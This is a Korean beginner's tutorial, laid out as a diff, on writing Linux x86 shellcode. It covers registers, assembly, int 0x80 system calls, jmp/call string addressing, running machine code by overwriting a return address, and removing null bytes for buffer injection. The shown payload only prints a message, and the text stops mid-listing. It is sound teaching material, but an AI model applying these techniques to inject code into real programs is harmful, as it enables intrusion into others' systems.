@@ -1,0 +1,1070 @@
+*** How to make shellcode in linux for beginners ***                 Willy in Null@Root
+                                                                     jeazon@hanmail.net
+------------------------------------------------------------------------------------------
+Shellcode를 만들기 위해서는 기본적으로 메모리 구조와 간단한 어셈블리어에 대한 이해를 필요
+로한다.  최근 Shellcode에 관한 많은 문서들이 소개되고 있으나 메모리나 어셈블리에 대하여
+어느 정도 알고 있는 사람을 대상으로 소개되고 있어 기계어 Code를 처음 접하는 사람들에게는 
+전체 흐름을 파악하는데 어려움이 있다.
+이 문서에서는 가장 기본이 되는 메모리의 구조 / 레지스터 / 어셈블리의 기본적인 명령어부터
+시작하여 Shellcode 제작과 수정뿐만아니라, 임의 기능의 system call을 수행하기 위한 기계어
+code를 만드는 것을 설명하였다.  
+참고로 이문서에 소개된 모든 내용은 Linux Red Hat 7.0 i686을 기본으로 만들어 졌으므로 CPU
+,OS에 따라서 다소 차이가 있을수 있다. 
+기타 이 문서에 대한 질문 / 지적사항이 있는 사람은 Willy (jeazon@hanmail.net)에게 연락바람.
+------------------------------------------------------------------------------------------
+
+<Test System 정보>
+CPU: GenuineIntel Pentium II 266MHz
+OS : Linux Redhat 7.0 i686
+GCC: (GNU) 2.96 20000731 
+GDB: GNU gdb 5.0
+
+<스텍과 레지스터>
+스텍(stack)은 메모리의 영역이며, 영어의 뜻을 보면 "쌓아올린 것" 저장공간이 쌓아 올리는 형태로
+되어있다는 의미이다. 우리가 프로그램을 수행하면서 생성된 data나 입력을 통하여 만들어진 data는 
+일단 이 스텍에 쌓였다가 필요시 CPU로 보내져 계산된고 그 결과물이 다시 스텍에 쌓이게 된다. 
+스텍에 쌓여 있는 data는 주소(address)를 이용하여 제어된다. 스텍은 2가지 특징이 있는데 하나는
+data를 push(추가)하면 낮은 주소 쪽으로 쌓인다 것과, 나중에 들어간 data가 먼저 나오는 lifo(last
+in first out)개념으로 항아리에 물건을 넣었다가 꺼낼때 맨 뒤에 넣은 것이 맨 먼저 나오는 것과 
+같다. 이것을 도식화 하면 아래와 같다..
+             
+          data in/out
+
+         |          |     0xfffffffb    하위 주소
+         +----------+
+         |  data 4  |     0xfffffffc
+         +----------+
+         |  data 3  |     0xfffffffd      
+         +----------+
+         |  data 2  |     0xfffffffe
+         +----------+
+         |  data 1  |     0xffffffff     상위 주소
+         +----------+
+
+레지스터(register)는 CPU의 영역으로 고속연산을 하기위해 사용되는 unit이다. 레지스터에는 ax,bx,
+cx,dx,si,di,bp,sp식으로 이름이 붙어 있는데, 이것은 사람에게 이름을 붙여 각 개인의 고유 id를 
+부여하는 것과 같다. 즉 명령을 수행할때 위치를 찾기 위해 사용된다고 보면된다. 레지스터의 종류는 
+일반목적 레지스터(general-purpose register), 상태 레지스터(status register)와 세그먼트 레지
+스터(segment register)등이 있는다. 그중에서 일반적으로 가장 많이 쓰이며 기본이 되는 일반목적의
+레지스터(general-purpose register)만 이해해도 shellcode를 만드는데 큰 무리가 없을 것으로 생각
+된다. 일반목적의 레지스터의 8개(ax,bx,cx,dx,si,di,bp,sp) 정도가 있으며, 그중에 ax,bx,cx,dx는 
+계산을 위해 직접적으로 data를 주고 받는 레지스터이며, si,di,bp,sp는 주소를 주고 받는 레지스터
+이다. 32비트 CPU에서는 주소가 4바이트(32비트)이므로 "e"를 붙여서 4바이트로 확장하여 일반적으로 
+사용한다. 즉 이제 si,di,bp,sp의 확장 개념인 esi,edi,ebp,esp만 기억하면 된다. 
+
+       gerneral  |   status   |  segment
+       ----------+------------+----------
+       eax(ax)       eflags        cs
+       ebx(bx)        eip          ds
+       ecx(cx)                     ss 
+       edx(dx)                     es
+       esi                         fs
+       edi                         gs
+       ebp
+       esp        
+
+ax,bx,cx,dx는 data를 직접 처리하는 레지스터로 data의 크기에 따라 1바이트, 2바이트, 4바이트로 
+나누어 사용할 수도 있다. 즉 ax는 2바이트인데 al(1바이트) + ah(1바이트)로 나누어 쓸수있으며 
+al은 ax의 낮은쪽 1바이트(8비트), ah은 높은쪽 1바이트(8비트)를 의미한다. 또한 ax앞에 e를 붙이면 
+4바이트로의 확장을 의미한다.  이것을 도식화 하면
+
+   +----+----+----+----+
+   |    |    |    |    |   eax    ( 4바이트, 32비트,  0 ~ 0xffffffff )
+   +----+----+----+----+
+   |    |    |             ax     ( 2바이트, 16비트,  0 ~ 0xffff )
+   +----+----+
+   | al | ah |             al,ah  ( 1바이트,  8비트,  0 ~ 0xff )
+   +----+----+
+
+   4바이트  |  2바이트  |  1바이트
+   ---------+-----------+---------
+    eax          ax        al , ah
+    ebx          bx        bl , bh
+    ecx          cx        cl , ch
+    edx          dx        dl , dh
+
+이렇게 data처리 레지스터의 크기를 나누어 쓰는 것은 효율적인 관리측면에서도 의미가 있겠지만 
+shellcode제작시엔 NULL(0x00)처리을 위해 중요하다. 좀더 구체적인 부분은 차차 설명하기로 한다.
+
+esi,edi,ebp,esp에 대해서 알아보자. si는 source index, di는 destination index의 약자로 필요시
+배열 참조할때 사용하는 레지스트리 정도로 이해 하면 될거 같고, esp는  stack pointer로 프로그램
+이 진행 되는 동안 stack의 최종 주소를 저장하는 곳이다. 프로그램이 진행이란 의미는 스택에 data
+가 저장되고 빠지는 동안 계속 변경된다는 것을 의미한다. 이렇게 esp가 계속 변경되므로 한 함수
+(frame) 내에서 stack의 기준 주소를 설정하게 되는데 이것이 ebp(base pointer, frame pointer) 
+이다. 그러므로 일반적으로 함수 내에서 첫번째로 하는 일이 기존 ebp를 저장(pushl %ebp)하고 초기
+의 esp를 ebp로 설정(movl %esp %ebp)하는 작업을 한다. 뒤에 실제 프로그램내에서 좀더 상세히 
+이해 하도록 하자.
+
+<어셈블리 구조와 기본 명령어>
+어셈블리의 기본 구조는 아래와 같이 5개의 영역(부분)으로  나누어져 있으며, Linux의 경우에는 
+AT&T syntax를 따르기 때문에 오피코드의 명령이 제1오피랜드에서 제2오피랜드쪽으로 작용한다.
+즉 아래의 예제의 경우 %esi의 값이 %ebp에 들어가게 된다.
+
+ 라벨  |  오피코드 |제1오피랜드 |제2오피랜드 | 설명문(주석)
+ ------+-----------+------------+------------+--------------
+ main:      movl      %esi,        %ebp         ; comment
+
+라벨은 직접 기계어로 번역되지 않고 분기명령(jmp, call)등에서 참조되어 주소의 계산에 사용된다.
+오피코드는 명령어이며 제1 & 2 오피랜드는 필요한 인수들이다.. 오피랜드는 오피코드에 따라 한개
+혹은 2개를 사용할수 있다.  기본 오피코드(명령어)에 대하여 의미와 사용법을 알아보자. Linux에서
+는 AT&T syntax을 따르기 때문에 이에 준하여 설명하겠다.
+
+ +------+--------------------+---------------------------+--------------------+ 
+ |명령어|   이용 방법        |    명령어의 의미          | C에서의 유사 표현  |
+ +------+--------------------+---------------------------+--------------------+ 
+ | mov  | movb $0x1,%eax     | 1을 eax에 넣음.(1 바이트) | eax = 0x01         |   
+ |      | movw $0x1,%eax     | 1을 eax에 넣음.(2 바이트) | eax = 0x0001       |   
+ |      | movl $0x1,%eax     | 1을 eax에 넣음.(4 바이트) | eax = 0x00000001   |   
+ | add  | addl $1, %eax      | eax에 1을 더하라.         | eax = eax + 1      |
+ | sub  | subl $1, %eax      | eax에서 1을 빼라.         | eax = eax - 1      |
+ | inc  | incl %eax          | eax에 1을 증가.           | eax++              |
+ | dec  | decl %eax          | eax에 1을 감소.           | eax--              |
+ | lea  | leal 0x8(%esi),%eax| eax에  esi+8주소를 넣어라.| eax = esi + 8      |
+ | xor  | xor %eax, %eax     | 둘을 비교해서 같으면 0    | if(a==b) b=0       |
+ | jmp  | jmp string         | 0x1f위치로 jump하라.      | goto string        |
+ | call | call star          | 서브루틴을 call 함.       | star()             |
+ | ret  | ret                | 서브루틴에서 원래로 복귀  | return             |
+ | int  | int $0x80          | system call 위한 인터럽트 | -                  |
+ | push | push %ebp          | ebp값을 stack에 저장      | -                  |
+ | pop  | pop %esi           | stack에서 꺼내 esi에 저장 | -                  |
+ +------+--------------------+---------------------------+--------------------+
+
+이외에도 많은 명령어들이 있으나 위의 기본적인 명령어들만 충분이 이해한다면 shellcode를 만드
+는데 큰 문제가 없을 것이다. 
+
+<어셈블리 프로그램 이해>
+지금까지 몇개의 레지스터의 이름과 간단한 어샘블리 명령어에 대하여 알아보았다. 이제 Linux에서 
+사용되는 어셈블리의 구조를 알아보기 위하여 간단한 C언어 프로그램을 만들어서 어셈블리언어로 
+컴퍼일 해보자. 우리는 프로그램 내에서 스텍에 data가 어떻게 쌓이고 처리되는지 esp와 ebp의 
+변화를 통하여 알아 볼려고 한다.
+
+[willy@Null2Root]$ cat test11.c
+main()
+{
+  int a=1;
+  printf(" a is %d \n",a);
+}
+
+a를 변수로 정의한뒤 a에 1을 넣고 출력하라는 간단한 프로이다.
+
+[willy@Null2Root]$ gcc test11.c -S -o test11.s -mpreferred-stack-boundary=2
+
+여기서 -mpreferred-stack-boundary=2 옵션을 사용한 이유는 gcc 2.95이상의 버전에서 stack의 구조가
+일부 변경되어 예전의 stack구조를 사용하기 위해서 추가하였으며, -S 옵션은 어셈블리로 컴퍼일하는
+옵션이다.
+
+[willy@Null2Root]$ cat test11.s
+        .file   "test1.c"
+        .version        "01.01"
+gcc2_compiled.:
+                .section        .rodata
+.LC0:
+        .string " a is %d \n"
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $4, %esp
+        movl    $1, -4(%ebp)
+        pushl   -4(%ebp)
+        pushl   $.LC0
+        call    printf
+        addl    $8, %esp
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.0)"
+  
+이와같이 조금 복잡한 구조로 되었있다. 여기서 직접적으로 프로그램실행과 관계가 없는 부분들을 
+제거하면 아래와 같은 간단한 구조로 만들수 있다.
+
+.LC0:
+        .string " a is %d \n"
+.globl main
+main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $4, %esp
+        movl    $1, -4(%ebp)
+        pushl   -4(%ebp)
+        pushl   $.LC0
+        call    printf
+        addl    $8, %esp
+        leave
+        ret
+
+여기서 .LC0: 와 main:은 라벨이며 .globl main 부분은 main을 함수로 정의하는 부분이다. 그리고 
+main: 내에서의 프로그램을 보면 아래와 같다.. 특히 %esp와 %ebp에 대하여 유의해서 관찰해볼 
+필요가 있다. 여기서 보여주는 esp & ebp값은 상대값이다.
+
+     +---------------------+-----+-----+-----------------------------------------------+
+     |    명    령         |%esp |%ebp |           설      명                          | 
+     +---------------------+-----+-----+-----------------------------------------------+
+     |pushl   %ebp         | 0x00| old | 기존 ebp값을 stack에 저장함. ret시 환원위함   |
+     |movl    %esp, %ebp   |-0x04| old | 현재의 esp를 ebp로 설정.(한 함수내에서 일정)  | 
+     |subl    $4, %esp     |-0x04| 0x04| 변수값 저장을 위해 stack공간 확보(int 4bytes) |
+     |movl    $1, -4(%ebp) |-0x08| 0x04| ebp기준 -4바이트 위치에 1을 넣음.(a=1)        |
+     |pushl   -4(%ebp)     |-0x08| 0x04| ebp기준 -4위치의 값을 stack에 넣음            |
+     |pushl   $.LC0        |-0x0c| 0x04| .LC0주소값을 stack에 넣음 (" a is %d \n")     |
+     |call    printf       |-0x10| 0x04| printf()함수를 부름                           |
+     |addl    $8, %esp     |-0x10| 0x04| esp를 8바이트 더함 (화원함)                   |
+     |leave                |-0x08| 0x04|                                               |
+     |ret                  |-0x00| old | 복귀.(return)                                 |
+     +---------------------+-----+-----+-----------------------------------------------+
+
+어셈블리에서 가장 혼돈하기 쉬운 부분이 stack에 쌓이는 data의 위치이다. C언어의 경우에 data가
+저장되는 절대값을 표시하기 때문에 어려움이 없으나 어셈블리의 경우에는 push, sub, add,ret등의 
+명령어를 절대주소 없이 수행하여도 순서에 의해 stack가감 된다.  esp는 stack에서 data가 쌓여
+있는 제일 끝 주소을 표시하므로 data의 증감에 따라 esp도 계속 변하게 된다.  data의 처리는 때론
+특정 위치의 값을 참조하거나 변경시켜야 하는 경우가 있는데 (위에서 pushl -4(%ebp) 같은 경우) 
+이럴때 매 순간 변화하는 esp를 기준으로 상대주소값을 잡기가 쉽지 않다. 그러한 이유에서 한 
+함수(function)내에서 기준에 되는 한 주소를 설정하는데 그것이 바로 ebp이다. 위 도표를 보면 함수
+(main)에 들어와서 첫번째로 하는과정이 바로 전에 가지고 있던 ebp를 저장하고 초기 esp를 ebp저장
+해서 함수가 끝날때까지 일정한 주소값을 유지하는 것을 볼수 있다. esp와 ebp는 하나의 함수가 
+실행되었다가 끝나는 ret 싯점 에서는 모두 초기 값을 갖게 된다.
+프로그램의 흐름을 보면 ebp를 설정한뒤 a의 변수값으로 1을 넣고, 그 a값을 stack에 저장(pushl
+-4(%ebp))하고 string " a is %d \n"을 stack에 저장한 뒤 printf()함수를 call한다. 이는 원래
+printf(" a is %d \n",a);보면 함수의 매계인수를 뒤쪽부터 stack에 넣는 것을 볼수있다.
+
+조금더 이해를 하기 위해 어샘블리 프로그램(test11.s)을 수정하여 아래와 같은 C언어 프로그램의
+출력 결과와 같도록 해 보자.. 
+
+--------------- C언어 ---------------------
+  int a=1, b=2;
+  printf("a=%d, b=%d \n",a,b);
+-------------------------------------------
+
+ - 먼저 string부분은 바꾼다.. " a is %d \n" -> "a=%d, b=%d \n" 
+ - ebp부분은 변경할 것이 없고..
+ - 변수 정의 부분을 수정한다.  int a (4바이트) -> int a, b (8바이트)
+                               subl $4, %esp   -> subl $8, %esp
+ - a변수에 1을 넣는다.         movl $1, -4(%ebp)
+ - b변수에 2를 넣는다.         movl $2, -8(%ebp)
+ - b값을 stack에 넣는다.       pushl   -8(%ebp)
+ - a값을 stack에 넣는다.       pushl   -4(%ebp)
+ - string라벨 주소를 push한다. pushl   $.LC0
+ - call printf
+ - esp위치를 수정.             addl  $12, %esp
+
+[willy@Null2Root] cat test12.s
+.LC0:
+        .string "a=%d, b=%d \n" 
+.globl main
+main:
+        pushl   %ebp          
+        movl    %esp, %ebp
+        subl    $8, %esp
+        movl    $1, -4(%ebp)
+        movl    $2, -8(%ebp)
+        pushl   -8(%ebp)
+        pushl   -4(%ebp)
+        pushl   $.LC0
+        call    printf
+        addl    $12, %esp
+        leave
+        ret
+
+[willy@Null2Root]gcc test12.s -o test12
+
+[willy@Null2Root]$ ./test12
+a=1, b=2 
+
+지금까지 간단한 어셈블리 프로글램 분석을 통하여 스텍의 구조와 esp, ebp의 변화와 의미를 이해
+할수 있었다. 이제부터는 system call를 이용한 처리에 대하여 알아보자.
+
+<어셈블리에서 인터럽트와 system call>
+system call이란 시스템에 미리 만들어 놓은 루틴(함수)를 이용하여 처리하는 것을 말한다. 호출은
+interrupt를 이용하며 Linux에서는 인터럽트 0x80(int $0x80)을 사용하다.  system call을 하는 방법
+은 미리 규정된 펑션번호와 관련된 인수들을 eax,ebx,ecx,edx.. 순으로 채워 넣은뒤 int $0x80을 
+함으로써 가능하다. 함수번호는 항상 eax에 위치하며 ebx부터는 적당한 인수들이 오게된다. 
+Linux에서는 /usr/include/asm/unistd.h에서 system call관련 함수번호를 정의 한다.  몇가지 보면
+다음과 같다.
+ 
+#define __NR_exit                 1
+#define __NR_write                4
+#define __NR_execve              11
+#define __NR_setreuid            70
+#define __NR_setregid            71
+
+ebx,ecx,edx...에 어떤 값이 들어가는지는 함수번호(eax에 들어가는 값)에 의존하여 설정되게 되며
+System Call Table(http://quaff.port5.com/syscall_list.html)을 참조하면 알수있다. 다른 방법으로
+C언어로 프로그램을 만든뒤 gdb에서 disassemble을 통하여 알수 있다. 
+
+이제 system call이라는 것을 이해하기 위하여 다른 예제를 만들어 보자. 아래는  "I'm Willy in 
+Null@Root"를 출력하는 간단한 C언어 프로그램이다. 
+
+[willy@Null@Root]$ cat test21.c
+main()
+{
+   write(1,"I'm Willy in Null@Root\n",23);
+}
+
+[willy@Null@Root]$ gcc test21.c -o test21 -mpreferred-stack-boundary=2 -static
+여기서 -static 옵션을 쓴 이유는 인터럽트 부분을 보기 위해서이다.
+
+[willy@Null@Root]$ ./test21
+I'm Willy in Null@Root
+
+[willy@Null@Root]$ gdb -q test21
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80481dc <main>:       push   %ebp
+0x80481dd <main+1>:     mov    %esp,%ebp
+0x80481df <main+3>:     push   $0x17
+0x80481e1 <main+5>:     push   $0x808b1c8
+0x80481e6 <main+10>:    push   $0x1
+0x80481e8 <main+12>:    call   0x804c390 <__libc_write>
+0x80481ed <main+17>:    add    $0xc,%esp
+0x80481f0 <main+20>:    leave  
+0x80481f1 <main+21>:    ret    
+0x80481f2 <main+22>:    nop    
+0x80481f3 <main+23>:    nop    
+End of assembler dump.
+(gdb) disassemble __libc_write
+Dump of assembler code for function __libc_write:
+0x804c390 <__libc_write>:       push   %ebx
+0x804c391 <__libc_write+1>:     mov    0x10(%esp,1),%edx
+0x804c395 <__libc_write+5>:     mov    0xc(%esp,1),%ecx
+0x804c399 <__libc_write+9>:     mov    0x8(%esp,1),%ebx
+0x804c39d <__libc_write+13>:    mov    $0x4,%eax
+0x804c3a2 <__libc_write+18>:    int    $0x80
+0x804c3a4 <__libc_write+20>:    pop    %ebx
+0x804c3a5 <__libc_write+21>:    cmp    $0xfffff001,%eax
+0x804c3aa <__libc_write+26>:    jae    0x804cab0 <__syscall_error>
+0x804c3b0 <__libc_write+32>:    ret    
+End of assembler dump.
+
+disassemble main을 보면 ebp를 설정하고, 0x17(string크기), string address, 1(std_out)을 stack
+으로 넣은 뒤 call을 하는 것을 볼수 있다. 이는 위에서 설명했던 것처럼 함수를 call하기 전에
+인수들을 맨 뒷거 부터 stack에 넣는 것을 알수 있다. disassemble __libc_write를 보면 순서가 
+다르더라도 eax, ebx, ecx, edx에 data가 들어간뒤 int $0x80으로 system call을 하는것을 알수 
+있다. 그럼 eax, ebx, ecx, edx에 어떤 값이 채워지는지 보기로 하자..  
+
+0x804c391 <__libc_write+1>:     mov    0x10(%esp,1),%edx  이 위치에서 stack에 쌓여있는 data를
+보면.
+
+        +----------+
+        |   %ebx   |   <--- %esp 값                    (낮은 주소)
+        +----------+
+        |   ret    |    %esp + 0x04
+        +----------+
+        |   0x1    |    %esp + 0x08    ---> %ebx
+        +----------+
+        |string주소|    %esp + 0x0c    ---> %ecx  
+        +----------+
+        | 0x17(23) |    %esp + 0x10    ---> %edx       (높은 주소)
+        +----------+
+
+eax,ebx,ecx,edx에는 아래와 같은 data가 들어간뒤 인터럽트(int $0x80)가 되는 것을 알수있다.
+ 
+        +----------+----------+--------------------------------------+
+        |   %eax   |   0x04   |  write()를 의미하는 system call no.  | 
+        +----------+----------+--------------------------------------+
+        |   %ebx   |   0x01   |  STANDARD_OUT의 의미                 |
+        +----------+----------+--------------------------------------+
+        |   %ecx   | str addr |  string의 주소                       |
+        +----------+----------+--------------------------------------+
+        |   %edx   |   0x17   |  string의 size                       |  
+        +----------+----------+--------------------------------------+
+        |      int $0x80      |  system call 호출                    |
+        +---------------------+--------------------------------------+
+
+이제 이 결과를 이용하여 간단하게 위의 글자를 출력하는 프로그램을 어셈블리로 작성해 보자.
+
+[willy@Null@Root]$ cat test22.s
+.LC0:
+        .string "I'm Willy in Null@Root\n" 
+.globl main
+main:
+        movl    $0x04, %eax
+        movl    $0x01, %ebx
+        movl    $.LC0, %ecx
+        movl    $0x17, %edx
+        int     $0x80
+        ret
+
+[willy@Null@Root]$ gcc test22.s -o test22
+
+[willy@Null@Root]$ ./test22
+I'm Willy in Null@Root
+세그멘테이션 오류 (core dumped)
+
+일단 write()함수를 system call하여 문자를 출력하는데는 성공했다.. 그런데 그뒤에 세크멘테이션
+오류가 발생하는 문제가 있음를 볼수 있으며, 이는 프로그램의 종료시에 프로그램의 자원을 릴리즈
+하는 별도의 루틴이 설정되지 않았기 때문이다. 따라서 이를 해결하기 위해 exit() 시스템콜을 호줄
+해 줘야한다. 그 의미는 1차적으로 인터럽트를 수행하여 write()를 call하고 프로그램 종료전 또 
+한번에 인터럽트로 exit()을 수행 정상적인 종료가 되도록하는 것이다. 이것은 한 프로그램에서 몇개
+의 system call을 할수 있음을 의미하기도 한다. 그럼 exit() system call시 필요한 인수들을 알아
+보기 위하여 아래와 같이 간단한 C언어 프로그램을 작성한뒤 gdb로 내용를 살펴보자.
+
+[willy@Null@Root]$ cat test3.c
+main()
+{
+ exit(0);
+}
+
+[willy@Null@Root]$ gcc test3.c -o test3 -mpreferred-stack-boundary=2 -static
+
+[willy@Null@Root]$ gdb -q test3
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80481dc <main>:       push   %ebp
+0x80481dd <main+1>:     mov    %esp,%ebp
+0x80481df <main+3>:     push   $0x0
+0x80481e1 <main+5>:     call   0x80483a4 <exit>
+0x80481e6 <main+10>:    nop    
+0x80481e7 <main+11>:    nop    
+End of assembler dump.
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x804c330 <_exit>:      mov    %ebx,%edx
+0x804c332 <_exit+2>:    mov    0x4(%esp,1),%ebx
+0x804c336 <_exit+6>:    mov    $0x1,%eax
+0x804c33b <_exit+11>:   int    $0x80
+0x804c33d <_exit+13>:   mov    %edx,%ebx
+0x804c33f <_exit+15>:   cmp    $0xfffff001,%eax
+0x804c344 <_exit+20>:   jae    0x804ca70 <__syscall_error>
+End of assembler dump.
+(gdb) 
+
+_exit로 부터 %eax = 1, %ebx = 0 설정후 int $0x80을 하면 exit(0) 결과를 얻을수 있다. 
+
+             movl    $0x01, %eax
+             movl    $0x00, %ebx
+             int     $0x80
+
+이부분을 추가 하면 exit(0)이 system call되는 것을 알수 있다. 그럼 이것을 test22.s에 추가하여
+실행해 보자.
+
+[willy@Null@Root]$ cat test23.s
+.LC0:
+        .string "I'm Willy in Null@Root\n" 
+.globl main
+main:
+        movl    $0x04, %eax
+        movl    $0x01, %ebx
+        movl    $.LC0, %ecx
+        movl    $0x17, %edx
+        int     $0x80             <---  write()를 위한 인터럽트
+        movl    $0x01, %eax
+        movl    $0x00, %ebx
+        int     $0x80             <---  exit(0)을 위한 인터럽트 
+        ret
+
+[willy@Null@Root]$ cc test23.s -o test23
+
+[willy@Null@Root]$ ./test23
+I'm Willy in Null@Root
+
+이제 종료문제를 해결하였다. 만약 이것을 Shellcode처럼 기계어코드로 바꾸어 Buffer에 넣에 실행
+시킬려고 하면 어떤 문제가 있을까?  바로 string의 주소가 문제이다. 여기서는 string이 절대주소
+로 설정하였는데 이 절대주소는 임의의 Buffer에 넣어지면 아무런 관계가 없어 string을 찾을수 
+없다. 그러므로  기계어코드 내에서 주소를 찾을수 있도록 상대주소로 만들어 주어야 한다. 그러면
+상대주소가 되도록 하려면? 아래 test24.s와 같이 jmp 와 call를 사용하여 정의해 주면 된다.
+
+[willy@Null@Root]$ cat test24.s
+.globl main
+main:
+ 	jmp  	strings
+start: 	popl	%esi
+        movl    $0x04, %eax
+        movl    $0x01, %ebx
+        movl    %esi, %ecx
+        movl    $0x17, %edx
+        int     $0x80
+        movl    $0x01, %eax
+        movl    $0x00, %ebx
+        int     $0x80
+strings:call 	start
+        .string "I'm Willy in Null@Root\n" 
+
+위의 test23.s와 어떻게 바뀌었는지 보자.  위쪽에 jmp strings와 start: popl %esi가 추가되었고
+중간에 보면 $.LC0가 %esi로, 아래쪽에 strings: call start가 추가 되었으며, 문자열이 아래로 
+내려왔다.  이 프로그램의 수행 순서를 따라서 내용를 살펴보자.
+
+      step 1: 처음 jmp를 만나서 strings:로 이동 
+      step 2: strings:에 call은 다음위치인 문자열 주소를 stack에 저장한뒤 start로 이동
+      step 3: start:에 popl %esi은 마지막에 stack에 저장한 문자열 주소를 %esi에 넣는다.
+      step 4: movl를 통해서 %eax,%ebx,%ecx,%edx을 채운다. 이때 %ecx에 %esi(문자열주소)가
+              들어간다.
+      step 5: int $0x80으로 write() 함수 실행을 위한 system call을 한다.
+      step 6: movl로 %eax, %ebx를 채운다.
+      step 7: int %0x80으로 exit(0)함수를 system call한다. (정상종료)
+
+[willy@Null@Root]$ gcc test24.s -o test24
+[willy@Null@Root]$ ./test24
+I'm Willy in Null@Root
+
+정상적으로 실행된는 것을 확인하였다. 이제는 objdump를 이용하여 기계어코드를 만들어 보자.
+
+[willy@Null@Root]$ objdump -d test24
+
+             :
+             :                  
+0804841c <main>:
+ 804841c:       eb 20                   jmp    804843e <strings>
+
+0804841e <start>:
+ 804841e:       5e                      pop    %esi
+ 804841f:       b8 04 00 00 00          mov    $0x4,%eax
+ 8048424:       bb 01 00 00 00          mov    $0x1,%ebx
+ 8048429:       89 f1                   mov    %esi,%ecx
+ 804842b:       ba 17 00 00 00          mov    $0x17,%edx
+ 8048430:       cd 80                   int    $0x80
+ 8048432:       b8 01 00 00 00          mov    $0x1,%eax
+ 8048437:       bb 00 00 00 00          mov    $0x0,%ebx
+ 804843c:       cd 80                   int    $0x80
+
+0804843e <strings>:
+ 804843e:       e8 db ff ff ff          call   804841e <start>
+ 8048443:       49                      dec    %ecx
+ 8048444:       27                      daa    
+ 8048445:       6d                      insl   (%dx),%es:(%edi)
+ 8048446:       20 57 69                and    %dl,0x69(%edi)
+ 8048449:       6c                      insb   (%dx),%es:(%edi)
+ 804844a:       6c                      insb   (%dx),%es:(%edi)
+ 804844b:       79 20                   jns    804846d <__do_global_ctors_aux+0xd>
+ 804844d:       69 6e 20 4e 75 6c 6c    imul   $0x6c6c754e,0x20(%esi),%ebp
+ 8048454:       40                      inc    %eax
+ 8048455:       52                      push   %edx
+ 8048456:       6f                      outsl  %ds:(%esi),(%dx)
+ 8048457:       6f                      outsl  %ds:(%esi),(%dx)
+ 8048458:       74 0a                   je     8048464 <__do_global_ctors_aux+0x4>
+            :
+            :
+
+위의 코드를 jmp(0x0804841c)부터 call(0x080443e)까지 순서대로 정렬시켜 보면 0xeb\x20... 
+.... \xff\xff\xff가 되며 그뒤에 \x49 ~ \x0a는 문자열이므로 직접 문자를 추가하여 작성하면
+아래와 같은 기계어코드를 얻을수 있다.
+
+이 code를 정리해서 main()의 ret주소에 넣어 실행해 보자.
+
+[willy@Null@Root]$ cat test41.c
+char print_code[] =
+"\xeb\x20\x5e\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xf1\xba\x17\x00\x00\x00"
+"\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff"
+"I'm willy in Null@Root\n";
+
+main()
+{
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)print_code;
+}
+
+[willy@Null@Root]$ gcc test41.c -o test41
+[willy@Null@Root]$ ./test41
+I'm willy in Null@Root
+
+여기까지는 성공했다.. 그럼 모든것이 끝난것일까? print_code를 잘 보면 알겠지만 code중간에 
+NULL(0x00)이 포함되어있는 것을 볼수있다. 일반적인 입력인 경우 buf에 code입력시 중간에 NULL이
+있는 경우 문자열의 끝으로 인식하여 더이상 받지 않을것이다. 즉 전체의 기계어코드를 입력하는 
+것이 불가능해 지므로 없애야 한다. NULL을 삭제하는 방법으로는 같은 기능을 하는 다른 명령어로
+대체 사용하거나 처리하는 data크기를 변경하는 방법이 있을수 있다.  예를 들어 %eax에 0x00을
+넣어야 한는 경우 movl $0x00, %eax대신에 xor %eax,%eax와 같은 배타적 논리를 이용하여 NULL을 
+피할수 있으며, 작은 단위0x10을 넣어야 경우 movl $0x10, %eax을 쓰면 4바이트에 쓰여지게 되므로
+0x00000010이 되어 3개의 NULL이 만들어지게 되므로 movb %0x10,%al 이렇게 크기를 작게해서 계산
+하여 피할수 있다.
+
+자 그럼 여기서 Null이 나타나지 않토록 어셈블리 명령어를 수정해 보자.
+  +--------------------+---------------------+---------------------------------------+
+  |     수정 전        |       수정 후       |             설     명                 |
+  +--------------------+---------------------+---------------------------------------+
+  | movl  $0x04, %eax  | xor    %eax, %eax   | xor 이용 eax를 0x00000000으로 만든뒤  |
+  |                    | movb   $0x04, %al   | 마지막 1바이트에 0x04를 넣음.         |
+  +--------------------+---------------------+---------------------------------------+
+  | movl  $0x01, %ebx  | xor    %ebx, %ebx   | xor 이용 eax를 0x00000000으로 만든뒤  |  
+  |                    | movb   $0x01, %bl   | 마지막 1바이트에 0x01를 넣음.         |
+  +--------------------+---------------------+---------------------------------------+
+  | movl  $0x17, %edx  | xor    %edx, %edx   | xor 이용 eax를 0x00000000으로 만든뒤  |
+  |                    | movb   $0x17, %dl   | 마지막 1바이트에 0x17를 넣음.         |
+  +--------------------+---------------------+---------------------------------------+
+  | movl  $0x01, %eax  | xor    %eax, %eax   | xor 이용 eax를 0x00000000으로 만든뒤  |
+  |                    | movb   $0x01, %al   | 마지막 1바이트에 0x01를 넣음.         |
+  +--------------------+---------------------+---------------------------------------+
+  | movl  $0x00, %ebx  | xor    %ebx, %ebx   | xor %ebx %ebx는 두 값이 같은경우 0이됨|
+  +--------------------+---------------------+---------------------------------------+
+
+이렇게 수정한 내용을 test24.s에 반영하여 아래와 test25.s와 같이 만들수 있다.
+[willy@Null@Root]$ cat test25.s
+.globl main
+main:
+        jmp     strings
+start:  popl    %esi
+        xor     %eax, %eax
+        xor     %ebx, %ebx
+        xor     %edx, %edx
+        movb    $0x04, %al    
+        movb    $0x01, %bl    
+        movl    %esi,  %ecx   
+        movb    $0x17, %dl   
+        int     $0x80         
+        movb    $0x01, %al   
+        xor     %ebx, %ebx   
+        int     $0x80         
+strings:call start
+        .string "I'm Willy in Null@Root\n" 
+
+[willy@Null@Root]$ gcc test25.s -o test25
+[willy@Null@Root]$ ./test25
+I'm Willy in Null@Root
+
+컴퍼일하여 실행결과 아무런 문제가 없는 것을 확인하였으며 기계어코드를 얻기위해 objdump를 
+실행해 보면.
+
+[willy@Null@Root]$ objdump -d test25
+
+             :
+             :   
+0804841c <main>:
